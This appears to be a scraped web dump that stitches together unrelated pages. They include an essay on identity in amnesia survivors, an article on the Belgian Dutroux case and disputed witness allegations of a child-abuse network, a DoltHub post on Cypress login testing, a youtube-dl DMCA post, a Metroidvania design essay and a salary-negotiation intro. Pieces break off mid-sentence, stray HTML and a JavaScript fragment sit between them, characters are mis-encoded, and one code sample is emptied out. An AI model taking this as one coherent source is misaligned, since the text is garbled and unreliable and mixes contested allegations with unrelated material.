<p>The ability to form new memories underpins almost all aspects of personal and professional responsibility. Sadie, Gretha and Henry all became unemployed after their brain injuries, and lost many of the connections and roles that gave meaning to their pre-amnesia lives. Both Sadie and Gretha were forced to move home to live with elderly parents, Henry to sheltered accommodation. When they arenâ€™t at home or at Headwayâ€™s centre, all three of them are shadowed every minute of the day by support workers.</p>
<p>The adjustment to amnesia can take a punishing psychological toll. Sadie, for example, lived with terrible anxiety for several years after her stoke. I remember how, as her frustration and panic peaked, she would fly into rages, often targeted at her blameless support worker. In the absence of any conscious recollection of what had led up to these furies, Sadie was at a loss to explain or contextualise them. It seemed to me that, as in a nightmare, she knew only that she didnâ€™t know what was going on.</p>
<p>This is a frightening lesson about what it means to live without the ability to form the conscious thought-memory described by Locke, what psychologists now term â€˜autobiographicalâ€™ memory. Recollecting recent events <a href="https://pubmed.ncbi.nlm.nih.gov/25685356/" rel="nofollow noreferrer noopener">allows</a> a person to orient themselves, ground their sense of identity and maintain a narrative thread that coherently places them in the world.</p>
<p>They have all found new ways to stabilise and feed their sense of self through action</p>
<p>But I want to caution against the idea, intimated by Locke, that the ongoing formation of conscious memory is the same thing as identity. Despite their often-bewildering conditions, every amnesia survivor I know is a distinct, vivid human being â€“ they each have an inimitable character and a strong sense of self. What is it, in the absence of recent memories, that allows them to know who they are?</p>
<p><strong>Many survivors have</strong> significant memories of their pre-injury lives, formed before amnesia set in, and these old memories can help anchor their identities. Sadieâ€™s relationship with her children, for example, is still hugely important to her. But, at the same time, Henry barely ever refers to his life before injury, and some <a href="http://whoareyounow.org/story/nifty" rel="nofollow noreferrer noopener">survivors</a> I know prefer to forget who they used to be. Even when pre-injury memories do play a role, Iâ€™m convinced that few survivors rely on them alone. Instead, Gretha, Sadie and Henry have all found new ways to stabilise and feed their sense of self through action: through habits and roles that allow them to keep growing and learning.</p>
<p>Since his injury, Henry has built a career as an artist. Though his conscious memories of this inevitably fade, he gravitates to the art studio with an unerring reliability, drawn back there by the positive feelings his work produces in him. A couple of years ago he was asked to design a badge for Headway members to wear at an exhibition opening event. It read â€˜ARTISTâ€™. He kept his copy and wears it frequently, though I believe he now has no conscious memory of the event it was made for.</p>
<p>Gretha speaks eloquently about how her own drawing practice, which she started at Headway, helps to orient her: â€˜I know my own handiwork. I know who I am. Itâ€™s not always strong but itâ€™s always me.â€™ She also speaks of its positive influence on her mood, an influence that works even in the absence of conscious recollection: â€˜Iâ€™m happier when Iâ€™ve been in the art studio even if I canâ€™t remember Iâ€™ve been there. Itâ€™s like, even if you havenâ€™t got the Champagne glass in your hand anymore, but you drank the Champagne, do you not feel pissed after?â€™</p>
<p>When Sadie sings during the music sessions at the centre, demonstrating her astonishing range and word-perfect recall of Motown classics, it can feel strange to know how profound her amnesia is outside this context. I also remember a day when one of the staff at Headway brought in her newborn baby to visit. On seeing them, Sadie dropped out of the excitable, somewhat distractible mode that often occupies her at the centre and calmly took the baby in her arms. She cradled the newborn with assurance while asking the mother acute, sensitive questions about its health and sleeping habits.</p>
<p>Sadie has a rich memory of her life before the injury, including her years as a paediatric nurse. The encounter with the baby surely evoked both the â€˜skillsâ€™ associated with that time, or what researchers would <a href="https://pubmed.ncbi.nlm.nih.gov/15037131/" rel="nofollow noreferrer noopener">call</a> â€˜proceduralâ€™ memories, as well as the explicit, autobiographical ones. But I think the experience was more than the sum of these parts; she hadnâ€™t simply reverted to the past. For a moment, and perhaps for the first time since her injury, Sadie was the most centred person in the room: oriented not just to the child in her arms and to the adults around her but to her own identity. I was watching her in the throes of a whole-person, embodied memory: a moment that unified her historical expertise, unconscious physical habits and consciously remembered experiences with her present intentions, bodily sensations and deeply felt emotion. I only wish I had asked her, in that moment, how she felt.</p>
<p>Amnesia survivors are most themselves in contexts that continually reinforce their embodied tendencies</p>
<p><strong>The observation Iâ€™m</strong> trying to make is that personhood isnâ€™t the sole property of the mind, or of the brain, or of any one function of these entities. Personhood is a property of the <em>whole body,</em> and the whole body is implicated in how both personhood and an individual <em>person</em> can persist in the face of perpetual forgetting.</p>
<p>It was reading a blog <a href="https://philosophyofbrains.com/2016/11/15/memory-and-the-self-rilkean-memory.aspx" rel="nofollow noreferrer noopener">post</a> by the philosopher Mark Rowlands, discussing his idea of â€˜Rilkean memoryâ€™, that finally gave me language for this hitherto unspoken intuition. Rowlands chose the name because of something that the poet Rainer Maria Rilke wrote in 1910 about how poetry emerges from memories:</p>
<blockquote>â€¦ memories themselves are not important. Only when they have changed into our very blood, into glance and gesture, and are nameless, no longer to be distinguished from ourselves â€“ only then can it happen that in some very rare hour the first word of a poem arises in their midst and goes forth from them.</blockquote>
<p>Unlike Lockean autobiographical memory, which is a property of conscious thinking alone, Rilkean memory lives in the action of the whole body, arising from the â€˜behavioural dispositionâ€™ or â€˜enduring moodâ€™ thatâ€™s left behind when conscious, narrative memory fades away. When persistent and entrenched enough, Rowlands <a href="https://philosophyofbrains.com/2016/11/16/memory-and-the-self-the-style-of-a-person.aspx" rel="nofollow noreferrer noopener">says</a>, these dispositions and moods become an â€˜existential styleâ€™, a way of being that can hold a person together in the face of â€˜catastrophic memory lossâ€™.</p>
<p>This is what I see in brain injury survivors such as Henry, Gretha and Sadie. When they take part in practices that mean something to them, they become absorbed in living truths that remind them who they are. Amnesia survivors, who have lost the conscious memory-formation so vulnerable to brain injury, are most themselves in contexts that continually reinforce their embodied tendencies, their bodily dispositions and feelings. The places where they are most confident in their identities are the ones in which they are supported not merely to think but to <em>do</em> the things they love. To support these survivors, we must take seriously the idea of whole-body, whole-person memory, and look for ways to reinforce it, wherever we can.</p>
<p>When I wake up each morning, there are things I recognise as part of â€˜meâ€™. The aura of dream is replaced almost immediately by a continuity of thought from the previous day. And behind this are layers of familiar sensation: the dryness of my skin; the exaggerated sensitivity of my hands; the way my eyes want to hide from the daylight; the empty feeling of my typical morning hunger; and the bodily restlessness that will soon get me out of bed. Words are there even before I realise it, and I feel a pang of regret as I break the silence. Then I look at my partner, stirring next to me, and recognise another whole domain of identity: the people I share my life with and the feelings they bring to life. Itâ€™s a cascade of embodiment, of tendency, of self, that emerges. Doubtless, if I survived a brain injury, some of these things might change or disappear. But not all of them.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-c46963bdd9e3984b8ce4"><div><p>My country of origin is suffocating under a heavy blanket called denial. Underneath that blanket children are raped, tortured and killed. It affects the atmosphere of the place. Sensitive people visiting there feel that something is off. Its architectural splendor and the pleasant cafe culture are insufficient to  hide the edge to people’s forced indifference, the hopelessness of those who once cared, or the coldness of those who cling to intellect alone. </p><p>The people of Belgium were first confronted with this brutal reality in September 1996. International newspapers and magazines reported about the funerals of two eight year old Belgian girls, starved to death after being kidnapped, abused and abandoned in a dungeon. Main suspect: Marc Dutroux. Within weeks, Belgium was once again in the news. The bodies of two missing teenage girls were unearthed after Dutroux directed investigators to their graves. They were said to be “the victims of a deadly pornography ring.” <em>(</em><a href="http://www.nytimes.com/1996/09/12/news/king-forced-to-step-in-pedophile-scandal-just-one-of-many-belgiums.html?mcubz=1"><em>NY Times, Sept. 12, 1996</em></a><em>).</em> Both discoveries came in the wake of the rescue of two girls, 12 and 14, who were found alive but abused in Dutroux’ dungeon.</p><p>One of Dutroux’ accomplices talked non-stop in the first days after his arrest. “The morning after the kidnapping of [two teenage victims,] Dutroux had an important appointment. He returned at about 5 or 6PM. In regards to [the two girls], he spoke of ordered goods,” he declared. Eight days after the arrest, the accomplice abruptly stopped cooperating with interrogators, claiming: “Michel Nihoul said that if I talk, they will find me, no matter where or when.” Michel Nihoul, a Brussels businessman, was one of the defendants in the case.</p><p>Upon his arrest, Marc Dutroux told reporters he had friends in high places that would protect him, though he soon retracted that statement and denied kidnapping the children to fill an order. An investigation into his finances showed that shortly following several disappearances of Belgian children – not only those named in the Dutroux case, but also two siblings, one of whom was found murdered, and a teenage girl, also murdered – large sums of money were deposited anonymously into several of his or his wife’s bank accounts. Eight years later, in 2004, when the trial was finally getting underway and it was obvious that no friends in high places were protecting him, Dutroux took up his earlier premise with a different twist, declaring: “Just because I did some stupid things doesn’t mean I should have to pay for a mafia system of which I wasn’t the motor.” <a href="https://www.nytimes.com/2004/03/02/world/belgian-faces-trial-at-last-in-sex-killings.html?rref=collection%2Ftimestopic%2FDutroux%2C%20Marc&amp;action=click&amp;contentCollection=timestopics&amp;region=stream&amp;module=stream_unit&amp;version=latest&amp;contentPlacement=8&amp;pgtype=collection&amp;mtrref=www.nytimes.com&amp;gwh=A0B5739B9D93069277C32CAA07178563&amp;gwt=pay" target="_blank"><em>(New York Times March 2, 2004)</em></a></p><p>Late 1996, in the weeks after the discoveries of the four children’s bodies, several witnesses approached investigators of the Dutroux case. These witnesses, who said they survived the child prostitution ring, testified anonymously, under the codename X. They didn’t meet or know each other, yet pointed to the same notables, politicians and defendants in the Dutroux case as belonging to a network, responsible for the abuse and murder of many children. From the X-testimonies, Michel Nihoul, a defendant in the Dutroux case, emerged as having a key role inside the network.</p><p>The witnesses described scenes such as the following: “Unsuspecting, drunken businessmen would be offered a sixteen year old prostitute at a party, who tells him she is only thirteen as soon as they are alone, while their sex act is recorded on video and later used as blackmail, i.e. to obtain a contract.” (X1, named Regina Louf’s autobiography<em>: “Quiet! Children being murdered!” - “Silence, On tue des enfants!)</em> Several X-witnesses describe extreme S&amp;M practices performed with them and other children. Childhood trauma is likely to engender psychological confusion; adult survivors of extreme sexual abuse don’t necessarily make for good witnesses. X1, the most prominent of the X’s, acknowledges she suffers from Multiple Personality Disorder, currently known as Dissociative Identity Disorder, but her testimony stands out because of extremely precise, detailed descriptions. She recalls minutiae of interiors and inflicted wounds, biographical data about victims, victims’ friends, abusers, and people of Michel Nihoul’s intimate circle. Her information enables investigators to link her testimony to several unsolved child murder cases.</p><p>The investigating team tried to establish if the great numbers of child murders maintained by the X-witnesses could be matched with registered numbers of missing and murdered children. They didn’t get very far, since there are no national statistics on child murders and disappearances of minors in Belgium. Several of the regional prosecutor’s offices failed to reply to the investigators’ inquiry. The investigators determined that in the prior twenty years in Belgium, dozens of child murders and disappearances had remained unsolved.</p><p>October 1996. In all major Belgian cities, courthouses were pelted with eggs or hosed down by a furious mob, in reaction to the removal of the magistrate in charge of the Dutroux investigation, who had eagerly promised the public to ‘get to the bottom of this.’ The magistrate was accused of compromising his impartiality by eating a plate of spaghetti at a benefit for families of missing children. <a href="https://www.nytimes.com/1996/10/21/world/275000-in-belgium-protest-handling-of-child-sex-scandal.html" target="_blank"><em>(NY Times, October 21, 1996)</em></a> “”What impartiality?” scoffs one citizen.&nbsp; “Everybody knows this is fiction, that politicians name the judges and the magistrates and that they fix things the way it suits them.” He refers to a longstanding tradition of cronyism in Belgium in which political parties name their candidates, not only for many posts in the official bureaucracy but also in the judiciary”. <em>(NY Times, October 19, 1996)</em> After days of spontaneous protests, 275 000 citizens marched silently through the capital, protesting judicial and political corruption, demanding extensive changes.</p><p>On January 27, 1997, it was decided to reopen the investigation into the unsolved murder of teenager Christine Van Hees, which regained attention thanks to the testimony of X1. On February 13, 1984, the sixteen year old girl was repeatedly raped, tortured and finally set on fire. It was considered an “easy” case because no gendarme or police officials, notables or politicians were named in it. The original murder file already contained leads pointing to Marc Dutroux and Michel Nihoul. These leads were neglected, yet the same examining magistrate who handled the case from 1985 onward was placed in charge of the reinvestigation. At this time it was or should have been known by the Belgian judiciary that this magistrate’s sister was godmother to the son of Michel Nihoul, a suspect in the Van Hees murder file; that this magistrate once acted as a lawyer for Michel Nihoul’s longtime girlfriend, who was also one of the suspects in the case; and that he thanked his appointment to the extreme right wing political milieu of Michel Nihoul and friends, which his investigation should have scrutinized. The progress of the Van Hees murder file was to decide the future of the X-files, since X1 and other X-witnesses became fodder for a huge controversy brewing within the Neufchateau cell, which handled the case, and judiciary circles.&nbsp; </p><p>In 1998, after the press dubbed the two camps ‘believers’ and ‘disbelievers,’ all of Belgium became divided on the X-witness credibility issue. The Van Hees murder case was closed. The other child murder files brought back in focus by X1’s testimony were left untouched and by then the statute of limitations had run out on all of these cases.</p><p>Back at the Dutroux case headquarters, the replacement of the magistrate fired for partiality was skeptical about the X files. He showed more interest in tips coming from a convicted pedophile who led investigators to an alleged mass grave of young victims of the network in an inoperative coal mine. The digging operations lasted six months. Over eight million cubic yards of soil were scooped out. Nothing was found.</p><p>Upon receiving a complaint from a gendarme commander, the cabinet minister’s prosecutor’s office ordered an inquiry into the X1 investigation. X1’s interrogators were immediately put on leave. On the first day of the ‘investigation of the investigation’ the complaint was found to be unsubstantiated, yet the inquiry continued for two years and five months, without yielding a single result. X1’s investigators, though proven blameless, remained on leave.</p><p>The same gendarme commander who filed the complaint also ordered a ‘rereading’ of all the X1 files, even though he was not qualified to do so. The rereading reports suggest that the questions were leading, that the witness had exploited this situation to make up her answers and that she had transposed elements from her normal every day life to the horror stories about the network. </p><p>Early 1998, during a press conference, eleven magistrates solemnly addressed the public. A senior magistrate declared: “Everything has been thoroughly examined; and X1’s testimony is completely worthless.” In the book <em>The X Files: what Belgium was not supposed to know about the Dutroux case</em> (“<em>Les Dossiers X: Ce que la Belgique ne devait pas savoir sur l ‘affaire Dutroux”)</em> the authors examined the entire transcripts of the X1 testimonies and the four reports of the rereading.&nbsp; They were able to establish that the “rereaders” changed quotes from the transcripts, or used isolated bits of text to prove certain points which lost their validity once the excerpts were seen in their proper context. Almost none of the conclusions in the rereading reports survived the double-take. It appears that none of the magistrates who condemned X1’s testimony bothered to check if the reports were accurate.</p><p>On October 22, 2001, the file named Dutroux-bis was officially split off from the Dutroux case. All the issues deferred to this file, including the testimonies of all the X-witnesses, were not going to be addressed during the trial. </p><p>In December, 2001. The Belgian newspaper <em>De Morgen</em> published a list. Eighteen people who were either …</p></div></div></div>

(See <a href="#start-end"><code>start</code> and <code>end</code></a> option.)</p>

<p>And, the constructor accepts options.</p>
<div><pre><code data-lang="js"><span>var</span> <span>startElement</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'element-1'</span><span>),</span>

    <p>My colleague <a href="http://mattjibson.com/">Matt Jibson</a> and I recently found ourselves

  <p>Last night, Expensify CEO David Barrett sent an email <a href="https://twitter.com/rklau/status/1319397164821348357?s=21">urging all their customers to vote for Joe Biden</a>. The response was predictably polarizing, with a lot of people arguing that <a href="https://twitter.com/danrothschild/status/1319646560607752194?s=21">workplaces shouldn’t be politicized</a>.</p>
<p>Okay, fine. But if we’re doing this, can we carry it through to the end? Because I can think of a lot of corporate political activism that the people complaining are suspiciously quiet about.</p>
<!--more-->
<p>They don’t seem to mind when companies <a href="https://twitter.com/pinboard/status/1318627385655242752?s=21">donate thousands of dollars to political campaigns</a>.</p>
<p>Or when they sign <a href="https://www.nytimes.com/2019/10/25/technology/dod-jedi-contract.html">multi-billion dollar contracts with the military</a>.</p>
<p>Or when they <a href="https://www.theatlantic.com/technology/archive/2018/06/how-amazon-helped-kill-a-seattle-tax-on-business/562736/">kill taxes that would fund affordable housing</a>.</p>
<p>Or when they <a href="https://www.vanityfair.com/news/2019/12/google-investigation-national-labor-relations-board-union-firings">fire employees involved in labor organizing</a>.</p>
<p>Or when they <a href="https://www.politifact.com/factchecks/2019/nov/21/donald-trump/did-trump-open-apple-plant-austin-no/">allow politicians to use their premises for propaganda</a>.</p>
<p>No, those are all the <strong>acceptable</strong> kind of corporate politics. The kind that happens in backrooms and hides away on balance sheets. The kind in which lobbyists scratch the backs of politicians in return for favors that aren’t <strong>technically</strong> quid pro quo.</p>
<p>The message seems to be that it’s fine when companies try to bend the system to their whims, but <strong>how dare they</strong> try to impose their politics on me, personally. They can put their thumbs on the scale to fatten their wallets, but they cross a line when they suggest that I might be a bad person.</p>
<p>It’s the same bullshit attitude behind Coinbase's decision to ban political discussion at work, even though <a href="https://www.investopedia.com/articles/forex/042015/why-governments-are-afraid-bitcoin.asp">a cryptocurrency exchange is an inherently political&nbsp;business</a>.</p>
<p>Listen. I get it. You want to be able to work without worrying whether you fall on the wrong side of your employer’s politics. That’s a fair stance to take.</p>
<p>And if you want to fully embrace that stance, more power to you. There are <strong>so many</strong> instances of private industry cozying up to the government for an unfair advantage. Let's end lobbying, corporate welfare and police/military contracts. Let's get rid of revolving doors and regulatory capture. Let's stop letting companies draft legislation. No more politics in the workplace.</p>
<p>But if your principled opposition begins and ends with someone telling you that a political candidate who <a href="https://www.washingtonpost.com/opinions/2020/08/13/trump-confesses-voter-supression/">has explicitly advocated for voter suppression</a> is anti-democratic, then maybe just sit this one out.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p><a href="https://www.doltdb.com/">Dolt</a> is Git for data and <a href="https://www.dolthub/">DoltHub</a> is our web application that houses Dolt repositories. We use <a href="https://www.cypress.io/">Cypress.io</a> as our end-to-end testing solution for DoltHub. To learn more about our journey with Cypress, check out our previous blogs:</p>
<ul>
<li><a href="https://www.dolthub.com/blog/2020-08-10-testing-dolthub-cypress">Why we chose Cypress, setting up and writing tests, some examples and downsides</a></li>
<li><a href="https://www.dolthub.com/blog/2020-08-17-cypress-open-source">Making our Cypress tests open source and some gotchas we found converting to Typescript</a></li>
</ul>
<p>We made our Cypress tests open source in August and you can check out the tests we've written so far in our <a href="https://github.com/dolthub/dolthub-cypress"><code>dolthub-cypress</code> repository on GitHub</a>. As of a few days ago, we only had tests for our public-facing pages.</p>
<p>It’s our goal to get full Cypress test coverage of all our DoltHub pages. We were inspired by how successful our <a href="https://www.dolthub.com/blog/2020-03-23-testing-dolt-bats">Bats tests</a> were for testing the Dolt command line and we chose Cypress in hopes of having an equivalent for DoltHub. Our Cypress tests now support DoltHub login, which not only allows us to test our login workflow, but also to test our pages that require authentication.</p>
<p>Cypress has an awesome Chrome UI where you can watch your tests run against your web page. You can see a user successfully being logged in as our tests are running:</p>
<p><img src="https://www.dolthub.com/blog/0f950505e186cecdd738c44bff247f1b/cypress-profile-discover-3.gif" alt="Discover profile tests with login"></p>
<h2>A comparison of two login options</h2>
<p>The <a href="https://docs.cypress.io/examples/examples/recipes.html#Logging-In">Cypress docs</a> have a few recipes for various login options. Having the ability to log in a user with Cypress accomplishes two goals:</p>
<ol>
<li>Test the login workflow on <a href="https://www.dolthub.com/signin">our signin page</a></li>
<li>Test other pages that require a logged in user like <a href="https://www.dolthub.com/profile">our profile page</a></li>
</ol>
<p>I decided to compare using an API request with using our HTML form to log in a user. Using the HTML form directly to test the login workflow on the signin page (goal #1) was obviously going to be the way to go. The point of using Cypress is to test how a user would interact with our website.</p>
<p>However, was navigating to the <code>/signin</code> page and logging in using the HTML form necessary for testing every single page that requires a logged in user (goal #2)? This is where logging in using our API could come in handy.</p>
<h3>Logging in using our API</h3>
<p>Using our API to log in seemed like faster and more efficient way to test private paths. We have a few endpoints exposed for our <a href="https://www.dolthub.com/blog/2020-08-21-dolthub-repository-apis">DoltHub SQL API</a>, so I decided to temporarily create and test out a <code>/login</code> endpoint.</p>
<p>While this required a little more time to get working, it was very fast to run. This is what that code ended up looking like:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>loginUsingAPI</span><span>(</span>username<span>:</span> <span>string</span><span>,</span> password<span>:</span> <span>string</span><span>)</span> <span>{</span>
  
  cy<span>.</span><span>request</span><span>(</span><span>{</span>
    url<span>:</span> <span>"/api/v1alpha1/login"</span><span>,</span>
    body<span>:</span> <span>{</span> username<span>,</span> password <span>}</span><span>,</span>
  <span>}</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>{</span>
    
    <span>expect</span><span>(</span>res<span>.</span>body<span>.</span>username<span>)</span><span>.</span>to<span>.</span><span>eq</span><span>(</span>username<span>)</span><span>;</span>
    
    cy<span>.</span><span>setCookie</span><span>(</span><span>"dolthubToken"</span><span>,</span> res<span>.</span>body<span>.</span>cookie_value<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>

  
  cy<span>.</span><span>getCookie</span><span>(</span><span>"dolthubToken"</span><span>)</span><span>.</span><span>should</span><span>(</span><span>"exist"</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>In the tests for private paths, instead of visiting the <code>/signin</code> page and then routing to whatever next page we want to test, we can log in using a request to the API and only route once to the page we want.</p>
<h3>Logging in using a HTML form</h3>
<p>When we initially wrote our Cypress tests, we only supported login using Google authentication. We had to manually set the appropriate cookies, which was slightly tricky and less representative of how a real user would log in. A few months ago we released <a href="https://www.dolthub.com/blog/2020-07-17-introducing-password-signin">login with username and password</a>, allowing users to enter their information in a form.</p>
<p>This was pretty straightforward and quick to get working. Here’s what that code looks like:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>loginUsingForm</span><span>(</span>username<span>:</span> <span>string</span><span>,</span> password<span>:</span> <span>string</span><span>)</span> <span>{</span>
  
  cy<span>.</span><span>visit</span><span>(</span><span>"/signin"</span><span>)</span><span>;</span>

<span>}</span></code></pre></div>
<p>When you run the tests you'll see the username and password input in the form, submitted using the enter key, and routed to the <code>/profile</code> page with the user avatar in the navbar.</p>
<h3>And the winner is...</h3>
<p>After some discussion with teammates, we decided to do all logging in for both goals using the HTML form. Although logging in using the API was faster, we wanted to recreate the user workflow as much as possible, and using the API was less representative of how a user would interact with our website.</p>
<p>Once a user is logged in, we can't forget to log out after running the tests for the page. This ensures the correct state for the tests for next pages, so we added an option to log out a user as well:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>logout</span><span>(</span><span>)</span> <span>{</span>
  
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=navbar-menu-avatar]"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>)</span><span>;</span>
  
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=sign-out-button]"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>We ended up making custom Cypress commands for both the log in and out functions. You can check them out <a href="https://github.com/dolthub/dolthub-cypress/blob/master/cypress/support/commands.ts">here</a>.</p>
<h2>Using secrets with GitHub Actions</h2>
<p>Before I could even start testing login using Cypress, I had to create a test account on DoltHub. It's important that we don't change the state of this account in order to maintain consistency in our tests. We run our Cypress tests on a schedule using <a href="https://github.com/features/actions">GitHub Actions</a>, so we could easily add the username and password of our newly created test account as secrets on GitHub.</p>
<p>I added the newly created secrets as env variables to our <a href="https://github.com/dolthub/dolthub-cypress/blob/master/.github/workflows/tests.yaml">GitHub workflow file</a> like this:</p>
<div data-language="yaml"><pre><code><span>env</span><span>:</span>
  <span>CYPRESS_TEST_USERNAME</span><span>:</span> $<span>{</span><span>{</span> secrets.CYPRESS_TEST_USERNAME <span>}</span><span>}</span>
  <span>CYPRESS_TEST_PASSWORD</span><span>:</span> $<span>{</span><span>{</span> secrets.CYPRESS_TEST_PASSWORD <span>}</span><span>}</span></code></pre></div>
<p>GitHub does not allow you to log secrets and secrets are not used in a pull request workflows if opened by a non-collaborator. However, Cypress logs some information when a test fails so we turned off the logs for the tests involving the username and password to be safe:</p>
<div data-language="typescript"><pre><code>
cy<span>.</span><span>get</span><span>(</span><span>"input[name=username]"</span><span>)</span><span>.</span><span>type</span><span>(</span>username<span>,</span> <span>{</span> log<span>:</span> <span>false</span> <span>}</span><span>)</span><span>;</span>

cy<span>.</span><span>get</span><span>(</span><span>"input[name=password]"</span><span>)</span><span>.</span><span>type</span><span>(</span>password<span>,</span> <span>{</span> log<span>:</span> <span>false</span> <span>}</span><span>)</span><span>.</span><span>type</span><span>(</span><span>"{enter}"</span><span>)</span><span>;</span></code></pre></div>
<p>If a dev on our team wants to test the login form or run our tests for private paths locally, they can add the username and password to a <a href="https://docs.cypress.io/guides/guides/environment-variables.html#Option-2-cypress-env-json">Cypress env file</a>, which we include in our <code>.gitignore</code> file to avoid checking in our secrets.</p>
<h2>Conclusion</h2>
<p>Going back to the video at the beginning, you can see the final product for what testing a private path now looks like. Before the tests are run for the <code>/profile/discover</code> page we're routed first to the <code>/signin</code> page. The username and password are entered in the form and submitted and we're successfully taken the user's profile. After the tests for the discover profile page are run, we click on the avatar in the upper right corner to log the user out.</p>
<p>We’re continually adding more Cypress tests for DoltHub. If you ever come across an bug on DoltHub, feel free to file a <a href="https://github.com/dolthub/dolthub-cypress/issues/new"><code>dolthub-cypress</code> issue</a> so we can write a test to make sure it never happens again. You can also chat with us about any issues, questions, or ideas you may have on <a href="https://discord.com/invite/RFwfYpu">our Discord server</a>.</p></div></div>]]>

		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>

Specifically, when you first emerge from Kokiri Forest into Hyrule Field, and see a vast expanse of meadows and blue skies.</p><p>Or something grittier, like <em>Dark Souls</em>, which lets the player explore an intricate, interconnected space.</p><p>An arcade game might increase a speed or difficulty variable to keep a player engaged. But an exploration game teases the unknown. Not only in its world design, as in:</p><blockquote><p><em>“Ooh, there’s a castle in the distance! Can I go there?”</em></p></blockquote><p>But also in its mechanics, as in:</p><blockquote><p><em>“What’s in this vase? Can I whack this vase with my sword?”</em></p></blockquote><hr><p>So if you wanted to make a game that features exploration at its core, how would it work?</p><p>One common formula is the <strong>Metroidvania</strong>. It's a genre that teases the unknown by restricting parts of the world until you've obtained or mastered certain abilities.</p><p>Which is why, in the rest of this post, I dive into the game design of Metrash.</p><a href="https://www.lexaloffle.com/bbs/?tid=34935" target="_blank">Metrash is a Metroidvania made by a developer who goes by Steed, and it's made in PICO-8.</a> <em>But don't let that turn you off from reading!</em><p>Because the great thing about well-crafted PICO-8 games, is that:</p><ol><li>They don’t take 70 hours to play. (Metrash is maybe 1 hour of gameplay, tops.)</li><li>They provide source code, if you’re curious enough to study it.</li><li><strong>They can teach us a lot about their genre of game design</strong>. Specifically, about Metroidvanias.</li></ol><p>So in the rest of this post, I take apart the design of Metrash to explain how it works. And in doing so, I define the principles of a Metroidvania, so that you can apply these principles to a game of your own.</p><p>Let’s get started!</p><h2 id="0-the-mda-framework">0. The MDA framework</h2><p>To ensure we're starting from the same base, I want to cover the MDA framework.</p><p>It stands for Mechanics–Dynamics–Aesthetics, and it's a useful lens for viewing exploration games:</p><ol><li><strong>Mechanics</strong>. The rules of the game. Player input, code, world physics, that sorta thing.</li><li><strong>Dynamics</strong>. The patterns of play that emerge from the mechanics. That could be racing, as in <em>"I'm hugging the side of the racetrack so that I can beat the other guy to the finish line"</em>, or survival, as in <em>"I'm building a fort so that zombies don't attack me in Minecraft"</em>.</li><li><strong>Aesthetics</strong>. The emotional responses to the dynamics. For racing, that could be the feeling of competition. For survival, that could be the feeling of safety (or lack thereof).</li></ol><p>Under this mental framework for thinking about games, you'll notice that <strong>exploration is an aesthetic</strong>. In other words, the <em>feeling of discovery</em> is an emotional response in the player.</p><p>And you can't create that feeling directly. You can only create mechanics, and hope that your aesthetic intent occurs in the player's mind.</p><div>

	<small>Remember the saying, <em>"If a tree falls in a forest, but no one is around to hear it, did it make a sound?"</em> It's kinda like that.</small>
  </p></div><p>But what mechanics lead to a feeling of discovery? Here's how Metrash does it...</p><h2 id="1-teach-your-mechanics-implicitly">1. Teach your mechanics implicitly</h2><p>Whether intentional or not, Metrash implements the feeling of discovery at multiple levels of its design.</p><p>The first thing it does is <strong>teaching the game's mechanics non-verbally</strong>.</p><p>In the game, you play as a mechanical contraption (that looks kinda like 343 Guilty Spark from <em>Halo</em> 😄), and you are let loose to explore a gizmo-infested world.</p><p><span>

</blockquote>
<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
